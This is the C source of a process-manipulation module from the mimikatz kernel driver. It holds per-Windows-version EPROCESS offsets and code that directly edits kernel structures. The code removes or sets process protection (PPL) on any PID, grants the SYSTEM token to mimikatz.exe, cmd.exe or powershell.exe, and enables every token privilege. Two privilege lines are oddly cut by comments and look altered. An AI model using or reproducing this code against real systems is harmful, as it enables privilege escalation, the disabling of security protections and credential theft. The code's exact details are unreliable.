/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kkll_m_process.h"

const ULONG EPROCESS_OffSetTable[KiwiOsIndex_MAX][Eprocess_MAX] =
{					/*  EprocessNext, EprocessFlags2, TokenPrivs, SignatureProtect */
					/*  dt nt!_EPROCESS -n ActiveProcessLinks -n Flags2 -n SignatureLevel */
#ifdef _M_IX86
/* UNK	*/	{0},
/* XP	*/	{0x0088},
/* 2K3	*/	{0x0098},
/* VISTA*/	{0x00a0, 0x0224, 0x0040},
/* 7	*/	{0x00b8, 0x026c, 0x0040},
/* 8	*/	{0x00b8, 0x00c0, 0x0040, 0x02d4},
/* BLUE	*/	{0x00b8, 0x00c0, 0x0040, 0x02cc},
/* 10_1507*/{0x00b8, 0x00c0, 0x0040, 0x02dc},
/* 10_1511*/{0x00b8, 0x00c0, 0x0040, 0x02dc},
/* 10_1607*/{0x00b8, 0x00c0, 0x0040, 0x02e4},
/* 10_1703*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
/* 10_1709*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
/* 10_1803*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
/* 10_1809*/{0x00b8, 0x00c8, 0x0040, 0x02f4},
#else
/* UNK	*/	{0},
/* XP	*/	{0},
/* 2K3	*/	{0x00e0},
/* VISTA*/	{0x00e8, 0x036c, 0x0040},
/* 7	*/	{0x0188, 0x043c, 0x0040},
/* 8	*/	{0x02e8, 0x02f8, 0x0040, 0x0648},
/* BLUE	*/	{0x02e8, 0x02f8, 0x0040, 0x0678},
/* 10_1507*/{0x02f0, 0x0300, 0x0040, 0x06a8},
/* 10_1511*/{0x02f0, 0x0300, 0x0040, 0x06b0},
/* 10_1607*/{0x02f0, 0x0300, 0x0040, 0x06c0},
/* 10_1703*/{0x02e8, 0x0300, 0x0040, 0x06c8},
/* 10_1709*/{0x02e8, 0x0300, 0x0040, 0x06c8},
/* 10_1803*/{0x02e8, 0x0300, 0x0040, 0x06c8},
/* 10_1809*/{0x02e8, 0x0300, 0x0040, 0x06c8},
#endif
};

NTSTATUS kkll_m_process_enum(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer, PKKLL_M_PROCESS_CALLBACK callback, PVOID pvArg)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pProcess = NULL;
	for(
		pProcess = PsInitialSystemProcess;
		NT_SUCCESS(status) && (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[KiwiOsIndex][EprocessNext])) - EPROCESS_OffSetTable[KiwiOsIndex][EprocessNext]) != PsInitialSystemProcess;
		pProcess = (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[KiwiOsIndex][EprocessNext])) - EPROCESS_OffSetTable[KiwiOsIndex][EprocessNext])
		)
	{
		status = callback(szBufferIn, bufferIn, outBuffer, pProcess, pvArg);
	}
	return status;
}

NTSTATUS kkll_m_process_list_callback(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer, PEPROCESS pProcess, PVOID pvArg)
{
	NTSTATUS status;
	PKIWI_PROCESS_SIGNATURE_PROTECTION pSignatureProtect = NULL;
	PULONG pFlags2 = NULL;

	HANDLE processId = PsGetProcessId(pProcess);
	PCHAR processName = PsGetProcessImageFileName(pProcess);

	status = kprintf(outBuffer, L"%u\t%-14S", processId, processName);
	if(NT_SUCCESS(status))
	{
		if(KiwiOsIndex >= KiwiOsIndex_VISTA)
		{
			pFlags2 = (PULONG) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[KiwiOsIndex][EprocessFlags2]);
			status = kprintf(outBuffer, L"\t%s", (*pFlags2 & TOKEN_FROZEN_MASK) ? L"F-Tok" : L"     ");
			if(NT_SUCCESS(status))
			{
				if(KiwiOsIndex >= KiwiOsIndex_8)
				{
					pSignatureProtect = (PKIWI_PROCESS_SIGNATURE_PROTECTION) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[KiwiOsIndex][SignatureProtect]);
					status = kprintf(outBuffer, L"\tSig %02x/%02x", pSignatureProtect->SignatureLevel, pSignatureProtect->SectionSignatureLevel);
					if(NT_SUCCESS(status) && (KiwiOsIndex > KiwiOsIndex_8))
						status = kprintf(outBuffer, L" [%1x-%1x-%1x]", pSignatureProtect->Protection.Type, pSignatureProtect->Protection.Audit, pSignatureProtect->Protection.Signer);
				}
				else if(*pFlags2 & PROTECTED_PROCESS_MASK)
				{
					status = kprintf(outBuffer, L"\tP-Proc");
				}
			}
		}
		if(NT_SUCCESS(status))
			kprintf(outBuffer, L"\n");
	}
	return status;
}

NTSTATUS kkll_m_process_protect(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer)
{
	NTSTATUS status;
	PEPROCESS pProcess = NULL;
	PKIWI_PROCESS_SIGNATURE_PROTECTION pSignatureProtect = NULL;
	PULONG pFlags2 = NULL;
	PMIMIDRV_PROCESS_PROTECT_INFORMATION pInfos = (PMIMIDRV_PROCESS_PROTECT_INFORMATION) bufferIn;

	if(KiwiOsIndex >= KiwiOsIndex_VISTA)
	{
		if(pInfos && (szBufferIn == sizeof(MIMIDRV_PROCESS_PROTECT_INFORMATION)))
		{
			status = PsLookupProcessByProcessId((HANDLE) pInfos->processId, &pProcess);
			if(NT_SUCCESS(status))
			{
				if(KiwiOsIndex < KiwiOsIndex_8)
				{
					pFlags2 = (PULONG) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[KiwiOsIndex][EprocessFlags2]);
					if(pInfos->SignatureProtection.SignatureLevel)
						*pFlags2 |= PROTECTED_PROCESS_MASK;
					else
						*pFlags2 &= ~PROTECTED_PROCESS_MASK;
				}
				else
				{
					pSignatureProtect = (PKIWI_PROCESS_SIGNATURE_PROTECTION) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[KiwiOsIndex][SignatureProtect]);
					pSignatureProtect->SignatureLevel = pInfos->SignatureProtection.SignatureLevel;
					pSignatureProtect->SectionSignatureLevel = pInfos->SignatureProtection.SectionSignatureLevel;
					if(KiwiOsIndex > KiwiOsIndex_8)
						pSignatureProtect->Protection =  pInfos->SignatureProtection.Protection;
				}
				ObDereferenceObject(pProcess);
			}
		}
		else status = STATUS_INVALID_PARAMETER;
	}
	else status = STATUS_NOT_SUPPORTED;

	return status;
}

NTSTATUS kkll_m_process_token(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer)
{
	NTSTATUS status = STATUS_SUCCESS;
	PMIMIDRV_PROCESS_TOKEN_FROM_TO pTokenFromTo = (PMIMIDRV_PROCESS_TOKEN_FROM_TO) bufferIn;
	ULONG fromProcessId, toProcessId;
	HANDLE hFromProcess, hFromProcessToken;
	PEPROCESS pFromProcess = PsInitialSystemProcess, pToProcess = NULL;

	if(pTokenFromTo && (szBufferIn == sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO)))
	{
		if(pTokenFromTo->fromProcessId)
			status = PsLookupProcessByProcessId((HANDLE) pTokenFromTo->fromProcessId, &pFromProcess);
		if(NT_SUCCESS(status) && pTokenFromTo->toProcessId)
			status = PsLookupProcessByProcessId((HANDLE) pTokenFromTo->toProcessId, &pToProcess);
	}

	if(NT_SUCCESS(status))
	{
		status = ObOpenObjectByPointer(pFromProcess, OBJ_KERNEL_HANDLE, NULL, 0, *PsProcessType, KernelMode, &hFromProcess);
		if(NT_SUCCESS(status))
		{
			status = ZwOpenProcessTokenEx(hFromProcess, 0, OBJ_KERNEL_HANDLE, &hFromProcessToken);
			if(NT_SUCCESS(status))
			{
				status = kprintf(outBuffer, L"Token from %u/%-14S\n", PsGetProcessId(pFromProcess), PsGetProcessImageFileName(pFromProcess));
				if(NT_SUCCESS(status))
				{
					if(pToProcess)
						status = kkll_m_process_token_toProcess(szBufferIn, bufferIn, outBuffer, hFromProcessToken, pToProcess);
					else
						status = kkll_m_process_enum(szBufferIn, bufferIn, outBuffer, kkll_m_process_systoken_callback, hFromProcessToken);
				}
				ZwClose(hFromProcessToken);
			}
			ZwClose(hFromProcess);
		}
	}

	if(pToProcess)
		ObDereferenceObject(pToProcess);

	if(pFromProcess && (pFromProcess != PsInitialSystemProcess))
		ObDereferenceObject(pFromProcess);

	return status;
}

NTSTATUS kkll_m_process_systoken_callback(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer, PEPROCESS pProcess, PVOID pvArg)
{
	NTSTATUS status = STATUS_SUCCESS;
	PCHAR processName = PsGetProcessImageFileName(pProcess);

	if((RtlCompareMemory("mimikatz.exe", processName, 13) == 13) || (RtlCompareMemory("cmd.exe", processName, 7) == 7) || (RtlCompareMemory("powershell.exe", processName, 14) == 14))
		status = kkll_m_process_token_toProcess(szBufferIn, bufferIn, outBuffer, (HANDLE) pvArg, pProcess);

	return status;
}

NTSTATUS kkll_m_process_token_toProcess(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer, HANDLE hSrcToken, PEPROCESS pToProcess)
{
	PROCESS_ACCESS_TOKEN ProcessTokenInformation = {NULL, NULL};
	HANDLE hToProcess;
	PULONG pFlags2 = NULL;
	NTSTATUS status;
	HANDLE processId = PsGetProcessId(pToProcess);
	PCHAR processName = PsGetProcessImageFileName(pToProcess);

	status = ObOpenObjectByPointer(pToProcess, OBJ_KERNEL_HANDLE, NULL, 0, *PsProcessType, KernelMode, &hToProcess);
	if(NT_SUCCESS(status))
	{
		status = ZwDuplicateToken(hSrcToken, 0, NULL, FALSE, TokenPrimary, &ProcessTokenInformation.Token);
		if(NT_SUCCESS(status))
		{
			if(KiwiOsIndex >= KiwiOsIndex_VISTA)
			{
				pFlags2 = (PULONG) (((ULONG_PTR) pToProcess) + EPROCESS_OffSetTable[KiwiOsIndex][EprocessFlags2]);
				if(*pFlags2 & TOKEN_FROZEN_MASK)
					*pFlags2 &= ~TOKEN_FROZEN_MASK;
				else
					pFlags2 = NULL;
			}

			status = ZwSetInformationProcess(hToProcess, ProcessAccessToken, &ProcessTokenInformation, sizeof(PROCESS_ACCESS_TOKEN));
			if(NT_SUCCESS(status))
				status = kprintf(outBuffer, L" * to %u/%-14S\n", processId, processName);
			else
				status = kprintf(outBuffer, L" ! ZwSetInformationProcess 0x%08x for %u/%-14S\n", status, processId, processName);

			if((KiwiOsIndex >= KiwiOsIndex_VISTA) && pFlags2)
				*pFlags2 |= TOKEN_FROZEN_MASK;

			ZwClose(ProcessTokenInformation.Token);
		}
		ZwClose(hToProcess);
	}
	return status;
}

NTSTATUS kkll_m_process_fullprivileges(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pProcess = NULL;
	PACCESS_TOKEN pAccessToken = NULL;
	PKIWI_NT6_PRIVILEGES pPrivileges;
	PULONG pPid = (PULONG) bufferIn;

	if(KiwiOsIndex >= KiwiOsIndex_VISTA)
	{
		if(pPid && (szBufferIn == sizeof(ULONG)))
			status = PsLookupProcessByProcessId((HANDLE) *pPid, &pProcess);
		else
			pProcess = PsGetCurrentProcess();

		if(NT_SUCCESS(status) && pProcess)
		{
			if(pAccessToken = PsReferencePrimaryToken(pProcess))
			{
				status = kprintf(outBuffer, L"All privileges for the access token from %u/%-14S\n", PsGetProcessId(pProcess), PsGetProcessImageFileName(pProcess));
				
				pPrivileges = (PKIWI_NT6_PRIVILEGES) (((ULONG_PTR) pAccessToken) + EPROCESS_OffSetTable[KiwiOsIndex][TokenPrivs]);
				pPrivileges->Present[0] = pPrivileges->Enabled[0] /*= pPrivileges->EnabledByDefault[0]*/ = 0xfc;
				pPrivileges->Present[1] = pPrivileges->Enabled[1] /*= pPrivileges->EnabledByDefault[1]*/ = //...0xff;
				pPrivileges->Present[2] = pPrivileges->Enabled[2] /*= pPrivileges->EnabledByDefault[2]*/ = //...0xff;
				pPrivileges->Present[3] = pPrivileges->Enabled[3] /*= pPrivileges->EnabledByDefault[3]*/ = 0xff;
				pPrivileges->Present[4] = pPrivileges->Enabled[4] /*= pPrivileges->EnabledByDefault[4]*/ = 0x0f;

				PsDereferencePrimaryToken(pAccessToken);
			}

			if(pProcess != PsGetCurrentProcess())
				ObDereferenceObject(pProcess);
		}
	}
	else status = STATUS_NOT_SUPPORTED;

	return status;
}